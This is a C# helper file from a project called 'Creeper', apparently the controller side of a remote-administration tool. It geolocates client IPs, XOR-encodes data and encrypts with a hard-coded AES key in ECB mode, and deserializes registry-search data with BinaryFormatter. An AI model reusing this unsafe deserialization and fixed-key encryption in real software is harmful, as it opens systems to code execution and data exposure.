using System;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Creeper.Properties;
using MaxMind.GeoIP2;
using static Creeper.Helper.RegistrySeeker;

namespace Creeper.Helper
{
    public class Helper
    {
        public static DatabaseReader reader = new DatabaseReader(new MemoryStream(Resources.GeoLite2_City));

        
        public static byte[] Xor(byte[] buffer, string xorKey)
        {
            char[] key = xorKey.ToCharArray();
            byte[] newByte = new byte[buffer.Length];

            int j = 0;

            for (int i = 0; i < buffer.Length; i++)
            {
                if (j == key.Length)
                {
                    j = 0;
                }
                newByte[i] = (byte)(buffer[i] ^ Convert.ToByte(key[j]));
                j++;
            }
            return newByte;
        }

        public static string Map_ip(string ip)
        {
            try
            {
                if (Regex.IsMatch(ip, @"(^192\.168\.([0-9]|[0-9][0-9]|[0-2][0-5][0-5])\.([0-9]|[0-9][0-9]|[0-2][0-5][0-5])$)|(^172\.([1][6-9]|[2][0-9]|[3][0-1])\.([0-9]|[0-9][0-9]|[0-2][0-5][0-5])\.([0-9]|[0-9][0-9]|[0-2][0-5][0-5])$)|(^10\.([0-9]|[0-9][0-9]|[0-2][0-5][0-5])\.([0-9]|[0-9][0-9]|[0-2][0-5][0-5])\.([0-9]|[0-9][0-9]|[0-2][0-5][0-5])$)", RegexOptions.None))
                {
                    return "LAN IP";
                }

                if (ip == "127.0.0.1")
                {
                    return "LocalHost";
                }

                var city = reader.City(ip);

                return city.Country.Name + " " + city.City.Name;

            }
            catch
            {
                return "Unknown";
            }

        }

        public static string BytesToString(long byteCount)
        {
            string[] suf = { "B", "KB", "MB", "GB", "TB", "PB", "EB" };
            if (byteCount == 0)
            {
                return "0" + suf[0];
            }

            long bytes = Math.Abs(byteCount);
            int place = Convert.ToInt32(Math.Floor(Math.Log(bytes, 1024)));
            double num = Math.Round(bytes / Math.Pow(1024, place), 1);
            return (Math.Sign(byteCount) * num) + suf[place];
        }

        #region DeviceInfo

        

        #endregion

        #region Serialize

        public static RegSeekerMatch[] DeSerializeMatches(byte[] bytes)
        {
            RegSeekerMatch[] Matches = bytes.Deserialize<RegSeekerMatch[]>();
            return Matches;
        }

        public static RegSeekerMatch DeSerializeMatch(byte[] bytes)
        {
            RegSeekerMatch Match = bytes.Deserialize<RegSeekerMatch>();
            return Match;
        }

        public static RegValueData DeSerializeRegValueData(byte[] bytes)
        {
            RegValueData Value = bytes.Deserialize<RegValueData>();
            return Value;
        }

        public static byte[] Serialize(RegValueData Value)
        {
            return Value.Serialize();
        }

        #endregion
    }

    public static class Aes
    {
        private static byte[] keyArray = Encoding.UTF8.GetBytes("Creeper_Awww_Man");

        public static byte[] Encrypt(byte[] toEncryptArray)
        {
            RijndaelManaged rDel = new RijndaelManaged();
            rDel.Key = keyArray;
            rDel.Mode = CipherMode.ECB;
            rDel.Padding = PaddingMode.PKCS7;
            ICryptoTransform cTransform = rDel.CreateEncryptor();
            byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
            return resultArray;
        }

        public static byte[] Decrypt(byte[] toEncryptArray)
        {
            RijndaelManaged rDel = new RijndaelManaged();
            rDel.Key = keyArray;
            rDel.Mode = CipherMode.ECB;
            rDel.Padding = PaddingMode.PKCS7;
            ICryptoTransform cTransform = rDel.CreateDecryptor();
            byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
            return resultArray;
        }
    }

    public class Binder : SerializationBinder
    {
        public override Type BindToType(string assemblyName, string typeName)
        {
            Type typeToDeserialize = null;

            String currentAssembly = Assembly.GetExecutingAssembly().FullName;
            typeName = typeName.Replace("Client.Helper.RegManager", "Creeper.Helper");
            assemblyName = currentAssembly;

            typeToDeserialize = Type.GetType($"{typeName}, {assemblyName}");
            return typeToDeserialize;
        }
    }

    public static class Serializer
    {
        public static byte[] Serialize<T>(this T @object)
        {
            using (var ms = new MemoryStream())
            {
                new BinaryFormatter().Serialize(ms, @object);
                return ms.ToArray();
            }
        }

        public static T Deserialize<T>(this byte[] byteArray)
        {
            using (var ms = new MemoryStream(byteArray))
            {
                return (T)new BinaryFormatter
                {
                    Binder = new Binder()
                }.Deserialize(ms);
            }
        }
    }
}
